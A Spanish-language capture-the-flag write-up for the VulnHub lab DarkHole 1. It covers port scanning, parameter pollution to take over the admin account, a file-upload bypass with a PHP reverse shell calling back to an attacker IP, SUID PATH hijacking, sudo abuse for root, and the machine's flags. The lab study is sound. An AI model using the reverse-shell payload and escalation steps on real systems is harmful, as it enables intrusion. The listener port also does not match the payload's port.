---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/darkhole1
dificultad: Fácil
os: Linux
relacionados:
  - "[[Contaminación de Parámetros]]"
  - "[[SUID]]"
  - "[[ffuf]]"
  - "[[Bypass de Subida de Archivos]]"
  - "[[Bypass por Contaminación de Parámetros]]"
  - "[[Bypass del PATH en ejecución de binarios SUID]]"
---
#  VulnHub - DarkHole 1

## Reconocimiento

### Escaneo de Puertos y Servicios

Se inició con un escaneo completo de puertos usando **nmap** para detectar los servicios activos:
```bash
nmap -p- 192.168.29.246 -Pn
```

La salida reveló dos puertos abiertos:
- **Puerto 22/tcp:** Servicio SSH (OpenSSH 8.2p1 Ubuntu).
- **Puerto 80/tcp:** Servicio HTTP (Apache httpd 2.4.41 en Ubuntu).

Luego se ejecutó un escaneo más detallado con scripts de nmap para obtener información sobre versiones y configuraciones:
```bash
nmap -sC -sV -Pn -p22,80 192.168.29.246 -oN nmap.txt
```

Se observó, por ejemplo, que la cookie `PHPSESSID` no tenía la flag *httponly* configurada, lo cual podría ser relevante en algunos escenarios.

### Enumeración de Directorios

Utilizando **ffuf** se realizó una búsqueda de directorios y archivos ocultos en el servidor web:
```bash
ffuf -c -u "http://192.168.29.246/FUZZ" -e .php,.txt,.html,.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404
```

Entre las rutas encontradas se destacan:
- `index.php`
- `login.php`
- `register.php`
- Directorio `upload`
- Otros directorios como `css`, `js` y `config`
- Páginas adicionales como `logout.php` y `dashboard.php`

Aunque algunas rutas no ofrecían información crítica, las páginas **login.php** y **register.php** resultaron interesantes para posteriores pruebas.

---

## Análisis de Vulnerabilidades

### [[Contaminación de Parámetros]]

Al registrarse y acceder a la página de actualización de información, se notó que el parámetro GET `id` utilizado en las solicitudes HTTP parecía ser manipulable. Se capturó el tráfico (por ejemplo, con Burp Suite) y se observó que el parámetro `id` se podía modificar sin restricciones. Este análisis llevó a probar la técnica de contaminación de parámetros para modificar el cambio de contraseña, observándose que la respuesta era **200 OK**.

El comportamiento indicaba que, al enviar múltiples instancias del parámetro, el cambio se aplicaba a la cuenta con `id=1` (posiblemente la cuenta de **admin**).

### [[Bypass de Subida de Archivos]]

El panel de administración incluía una funcionalidad para subir archivos. Inicialmente, se intentó subir un archivo con extensión `.php`, pero el servidor aceptaba únicamente archivos con extensiones de imagen (`.png`, `.jpg`, `.gif`).  
El análisis reveló que la restricción se basaba únicamente en la extensión, lo que abrió la posibilidad de renombrar el archivo malicioso para evadir el filtro.

Archivo a subir `.phar`:
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/172.16.217.148/443 0>&1'");
?>
```

### Binario [[SUID]] Mal Configurado

Dentro del sistema se encontró un binario llamado `toto` con permisos SUID, detectado con el comando:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Al ejecutar `toto`, se observó que este invoca el comando `id` y lo ejecuta configurando el UID y GID del usuario **john**. El uso de `strings` sobre el binario evidenció funciones críticas como `setuid` y `setgid`, confirmando una mala configuración en el manejo de la variable de entorno `PATH`.

---

## Explotación de Vulnerabilidades

### Explotación de la [[Contaminación de Parámetros]]

Tras interceptar la solicitud de cambio de contraseña, se enviaron múltiples instancias del parámetro `id` para probar cuál se respetaba. La respuesta **200 OK** indicó que la operación se ejecutó correctamente.  
Se comprobó que, al intentar iniciar sesión con la contraseña antigua, el acceso se mantenía, lo que confirmaba que el cambio se había aplicado a la cuenta con `id=1` (presumiblemente la cuenta **admin**).

### Bypass en la Subida de Archivos

Para eludir la restricción de subida de archivos:
1. Se renombró el archivo de shell de `shell.php` a `shell.phtml`.
2. Se procedió a cargar el archivo modificado a través de la funcionalidad de subida en el panel de administración.
3. El archivo se ubicó exitosamente en el directorio `/upload`.

Posteriormente, se configuró un listener en la máquina atacante con **netcat**:

```bash
nc -nvlp 1234
```

La conexión entrante mostró una reverse shell operada por el usuario `www-data`.

### Explotación del Binario [[SUID]]

Con la shell obtenida como `www-data`, se exploró el sistema en busca de binarios SUID. El binario `toto` fue identificado y analizado.  

Para explotar la mala configuración en el manejo del PATH, se creó un script malicioso llamado `id` en el directorio `/tmp` con el siguiente contenido:
```bash
#!/bin/bash
bash
```

Se otorgaron permisos de ejecución amplios al script:
```bash
chmod 777 /tmp/id
```

Luego se modificó la variable de entorno para que `/tmp` tenga prioridad:
```bash
export PATH=/tmp:$PATH
```

Al ejecutar `/home/john/toto`, este invocó el script malicioso en lugar del comando `id` original, abriendo una shell interactiva como usuario **john**. La verificación con `whoami` confirmó la identidad.

---

## Escalada de Privilegios

### Obtención de Credenciales y Uso de Sudo

En el directorio home de **john** se encontró un archivo llamado `password`, que contenía parte de la contraseña del usuario.  

Ejecutando `sudo -l` se verificó que **john** tenía permiso para ejecutar el siguiente comando como root:
```bash
sudo -u root /usr/bin/python3 /home/john/file.py
```

### Modificación del Script para Obtener Shell Root

Dado que se podía editar el archivo `file.py`, se añadió el siguiente código en Python para lanzar una shell con privilegios root:
```python
import os
os.system("/bin/bash")
```

Al ejecutar el comando con sudo:
```bash
sudo -u root /usr/bin/python3 /home/john/file.py
```

Se obtuvo una shell con privilegios de root. Finalmente, se navegó al directorio `/root` y se leyó el archivo `root.txt`, el cual contenía la bandera:
```bash
cat /root/root.txt 
DarkHole{You_Are_Legend}
```

---

## Bandera(s)

> [!flag] `flag{user}`
> DarkHole{You_Can_DO_It}
bandera

> [!flag] `flag{root}`
> DarkHole{You_Are_Legend}
^bandera
